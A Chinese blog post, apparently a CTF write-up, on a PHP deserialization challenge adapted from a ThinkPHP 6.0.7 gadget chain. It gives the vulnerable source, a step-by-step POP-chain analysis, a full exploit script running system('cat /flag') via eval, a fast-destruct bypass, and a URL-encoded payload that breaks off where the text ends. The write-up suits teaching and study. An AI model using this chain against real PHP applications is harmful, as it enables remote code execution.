@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="在一次内部赛中,偶遇一个反序列化题目,它是改编ThinkPHP v6.0.7 eval反序列化的一个题目,涉及的知识也比较经典.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="改编ThinkPHP v6.0.7 eval反序列化题目">
+<meta property="og:url" content="http://example.com/2022/03/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/index.html">
+<meta property="og:site_name" content="cr0fyの博客">
+<meta property="og:description" content="在一次内部赛中,偶遇一个反序列化题目,它是改编ThinkPHP v6.0.7 eval反序列化的一个题目,涉及的知识也比较经典.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/.com//image-20220314222932459.png">
+<meta property="article:published_time" content="2022-03-14T12:09:05.000Z">
+<meta property="article:modified_time" content="2022-03-14T14:46:04.221Z">
+<meta property="article:author" content="cr0fy">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/.com//image-20220314222932459.png">
+
+<link rel="canonical" href="http://example.com/2022/03/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>改编ThinkPHP v6.0.7 eval反序列化题目 | cr0fyの博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="cr0fyの博客" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">cr0fyの博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">生如夏花之灿烂，死如秋叶之静美</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-commonweal">
+
+    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/14/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%A2%98%E7%9B%AE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="cr0fy">
+      <meta itemprop="description" content="学而后知">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="cr0fyの博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          改编ThinkPHP v6.0.7 eval反序列化题目
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-03-14 20:09:05 / 修改时间：22:46:04" itemprop="dateCreated datePublished" datetime="2022-03-14T20:09:05+08:00">2022-03-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url" rel="index"><span itemprop="name">反序列化</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>在一次内部赛中,偶遇一个反序列化题目,它是改编ThinkPHP v6.0.7 eval反序列化的一个题目,涉及的知识也比较经典.</p>
+<span id="more"></span>
+
+<h1 id="源码附上"><a href="#源码附上" class="headerlink" title="源码附上"></a>源码附上</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">cmd</span>(<span class="params"><span class="variable">$code</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;code = <span class="variable">$code</span>;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;?&gt;&#x27;</span> . <span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Soeasy</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$type</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        array_push(<span class="variable">$args</span>, lcfirst(<span class="variable">$method</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> call_user_func_array([<span class="keyword">$this</span>, <span class="string">&#x27;ohhh&#x27;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ohhh</span>(<span class="params"><span class="variable">$value</span>, <span class="keyword">string</span> <span class="variable">$rule</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;type[<span class="variable">$rule</span>])) &#123;</span><br><span class="line">            <span class="comment">// 注册的验证规则</span></span><br><span class="line">            <span class="variable">$result</span> = call_user_func_array(<span class="keyword">$this</span>-&gt;type[<span class="variable">$rule</span>], [<span class="variable">$value</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Gogogo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$brother</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;just go little&quot;</span> . <span class="keyword">$this</span>-&gt;brother;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stop</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$warn</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$real_talk</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;warn-&gt;whoareyou(<span class="keyword">$this</span>-&gt;real_talk); <span class="comment">//别管这玩意哪里来的了，我也不知道</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$a</span>=unserialize(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;快点学会反序列化好么&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="逐步分析"><a href="#逐步分析" class="headerlink" title="逐步分析"></a>逐步分析</h1><p>源码中有 <strong><code>destruct()</code> <code> toString()</code> <code> call()</code></strong>  这几个魔术方法</p>
+<p>我们需要构造链子到达<code>Evil</code>类执行<code>cmd</code>方法达到命令执行的效果</p>
+<h2 id="魔术跳板"><a href="#魔术跳板" class="headerlink" title="魔术跳板"></a>魔术跳板</h2><h3 id="从destruct到toString"><a href="#从destruct到toString" class="headerlink" title="从destruct到toString"></a>从destruct到toString</h3><p>首先肯定要是从<code>destruct()</code>方法入口,其中有字符串拼接    <strong>return “just go little” . $this-&gt;brother;</strong></p>
+<p>而<code>$brother</code>是可控的,直接让其指向存在<code>toString</code>方法的类就可以触发该魔术方法</p>
+<p>这步需要的的操作就是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;brother = <span class="keyword">new</span> Stop();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="提一下触发toString的条件"><a href="#提一下触发toString的条件" class="headerlink" title="提一下触发toString的条件"></a>提一下触发toString的条件</h4><p>(1) echo($obj) / print($obj) 打印时会触发</p>
+<p>(2) 反序列化对象与字符串连接时</p>
+<p>(3) 反序列化对象参与格式化字符串时</p>
+<p>(4) 反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型）</p>
+<p>(5) 反序列化对象参与格式化SQL语句，绑定参数时</p>
+<p>(6) 反序列化对象在经过php字符串函数，如 strlen()、addslashes()时</p>
+<p>(7) 在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用</p>
+<p>(8) 反序列化的对象作为 class_exists() 的参数的时候</p>
+<h3 id="从toString到call"><a href="#从toString到call" class="headerlink" title="从toString到call"></a>从toString到call</h3><p><code>__call()</code>方法的触发是需要调用不存在的方法</p>
+<p>而在<code>toString</code>方法中就存在whoareyou方法没有被定义</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;warn-&gt;whoareyou(<span class="variable">$real_talk</span>);</span><br></pre></td></tr></table></figure>
+
+<p>而且<code>warn</code>和<code>real_talk</code>都是可控的,这个时候只需要让<code>warn</code>指向存在<code>call</code>方法的类就可以跳转,并且参数也传给 __call方法</p>
+<p>这步所需要的操作为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;real_talk = <span class="string">&quot;*******************&quot;</span>; <span class="comment">//命令执行的参数</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;warn = <span class="keyword">new</span> Soeasy();  <span class="comment">//换成Soeasy去触发__call</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析Soeasy类"><a href="#分析Soeasy类" class="headerlink" title="分析Soeasy类"></a>分析Soeasy类</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Soeasy</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$type</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        array_push(<span class="variable">$args</span>, lcfirst(<span class="variable">$method</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> call_user_func_array([<span class="keyword">$this</span>, <span class="string">&#x27;ohhh&#x27;</span>], <span class="variable">$args</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ohhh</span>(<span class="params"><span class="variable">$value</span>, <span class="keyword">string</span> <span class="variable">$rule</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;type[<span class="variable">$rule</span>])) &#123;</span><br><span class="line">            <span class="comment">// 注册的验证规则</span></span><br><span class="line">            <span class="variable">$result</span> = call_user_func_array(<span class="keyword">$this</span>-&gt;type[<span class="variable">$rule</span>], [<span class="variable">$value</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure>
+
+<p>当参数传给<code>__call</code>时</p>
+<p><code>$method</code>为 ‘whoareyou’          <code>$args</code>为数组 [‘$real_talk’]</p>
+<p>通过<code>array_push</code>函数(<em>用法:向数组尾部插入一个或多个元素</em>)</p>
+<p>使<code>$args</code>变成 [‘$real_talk’,’whoareyou’]</p>
+<p>然后通过<code>call_user_func_array</code>函数将数据$args传入ohhh方法中</p>
+<p>此时          </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$value</span>=<span class="variable">$real_talk</span>         <span class="variable">$rule</span>=whoareyou</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span> = call_user_func_array(<span class="keyword">$this</span>-&gt;type[<span class="variable">$rule</span>], [<span class="variable">$value</span>]);</span><br><span class="line">等价于</span><br><span class="line"><span class="variable">$result</span> = call_user_func_array(<span class="keyword">$this</span>-&gt;type[<span class="string">&#x27;whoareyou&#x27;</span>], [<span class="variable">$real_talk</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>此刻在Soeasy类下面定义一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">$this</span>-&gt;type[<span class="string">&#x27;whoareyou&#x27;</span>] = [<span class="keyword">new</span> Evil(), <span class="string">&#x27;cmd&#x27;</span>]; <span class="comment">//调用任意方法任意类</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>就会将<code>$real_talk</code>参数传入Evil类的cmd方法中,进行命令执行</p>
+<p>分析完毕</p>
+<h1 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$code</span>;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    public function cmd($code) &#123;</span></span><br><span class="line"><span class="comment">        $this-&gt;code = $code;</span></span><br><span class="line"><span class="comment">        eval(&#x27;?&gt;&#x27; . $this-&gt;code);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Soeasy</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$type</span> = [];</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;type = [</span><br><span class="line">            <span class="string">&quot;whoareyou&quot;</span> =&gt; [<span class="keyword">new</span> Evil,<span class="string">&#x27;cmd&#x27;</span>]];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    public function __call($method, $args) &#123;</span></span><br><span class="line"><span class="comment">        echo(&#x27;call方法&#x27;);</span></span><br><span class="line"><span class="comment">        echo &quot;\n&quot;;</span></span><br><span class="line"><span class="comment">        array_push($args, lcfirst($method));</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        return call_user_func_array([$this, &#x27;ohhh&#x27;], $args);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    public function ohhh($value, string $rule) &#123;          //$value相当于$real_talk   $rule就是whoareyou</span></span><br><span class="line"><span class="comment">        echo(4);</span></span><br><span class="line"><span class="comment">        echo &quot;\n&quot;;</span></span><br><span class="line"><span class="comment">        if (isset($this-&gt;type[$rule])) &#123;</span></span><br><span class="line"><span class="comment">            // 注册的验证规则</span></span><br><span class="line"><span class="comment">            $result = call_user_func_array($this-&gt;type[$rule], [$value]);   //call_user_func_array($this-&gt;type[&#x27;whoareyou&#x27;], [$real_talk])</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Gogogo</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$brother</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;brother = <span class="keyword">new</span> Stop();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    public function __destruct() &#123;</span></span><br><span class="line"><span class="comment">        echo(&#x27;destruct方法&#x27;);</span></span><br><span class="line"><span class="comment">        echo &quot;\n&quot;;</span></span><br><span class="line"><span class="comment">        return  &quot;just go little&quot; . $this-&gt;brother;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stop</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$real_talk</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$warn</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;real_talk=<span class="string">&quot;&lt;?php system(&#x27;cat /flag&#x27;);?&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;warn = <span class="keyword">new</span> Soeasy();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    public function __toString() &#123;</span></span><br><span class="line"><span class="comment">        echo(&#x27;toString方法&#x27;);</span></span><br><span class="line"><span class="comment">        echo &quot;\n&quot;;</span></span><br><span class="line"><span class="comment">        $blind=$this-&gt;warn-&gt;whoareyou($this-&gt;real_talk); //别管这玩意哪里来的了，我也不知道</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> Gogogo();</span><br><span class="line"><span class="variable">$b</span>=serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>但是输入payload后仍然会报错</p>
+<p>问题就出现在这行代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;快点学会反序列化好么&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>它会在反序列化之前开始报错,我们必须绕过它</p>
+<h1 id="fast-destruct"><a href="#fast-destruct" class="headerlink" title="fast destruct"></a>fast destruct</h1><p>提前反序列化就要运用到<strong>fast destruct</strong></p>
+<p>在著名的php反序列工具phpggc中提及了这一概念。具体来说，在PHP中有：</p>
+<p>&gt;1. 如果单独执行<code>unserialize</code>函数进行常规的反序列化，那么被反序列化后的整个对象的生命周期就仅限于这个函数执行的生命周期，当这个函数执行完毕，这个类就没了，在有析构函数的情况下就会执行它。</p>
+<p>&gt; 2. 如果反序列化函数序列化出来的对象被赋给了程序中的变量，那么被反序列化的对象其生命周期就会变长，由于它一直都存在于这个变量当中，当这个对象被销毁，才会执行其析构函数。</p>
+<p>&gt;</p>
+<p>但是通过 <code>fast destruct</code> 我们可以跳出这种固定的生命周期</p>
+<p>方法是修改序列化字符串的结构，利用错误的结构导致只完成了部分反序列化的 unserialize 强制退出，提前触发 <code>__destruct()</code></p>
+<p>可以去掉末尾的<code>&#125;</code> 删的一个不剩都可以</p>
+<p>或者更改生成序列化的数字元素个数</p>
+<p>或者在末尾最后一个<code>&#125;</code>前插入一些奇奇怪怪的字符<code>;</code>、<code>.</code> 等等等等</p>
+<h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">O</span>%<span class="number">3</span>A<span class="number">6</span>%<span class="number">3</span>A%<span class="number">22</span>Gogogo%<span class="number">22</span>%<span class="number">3</span>A<span class="number">1</span>%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A<span class="number">7</span>%<span class="number">3</span>A%<span class="number">22</span>brother%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A<span class="number">4</span>%<span class="number">3</span>A%<span class="number">22</span>Stop%<span class="number">22</span>%<span class="number">3</span>A<span class="number">2</span>%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A<span class="number">12</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span>real_talk%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A<span class="number">28</span>%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">3</span>C%<span class="number">3</span>Fphp+system%<span class="number">28</span>%<span 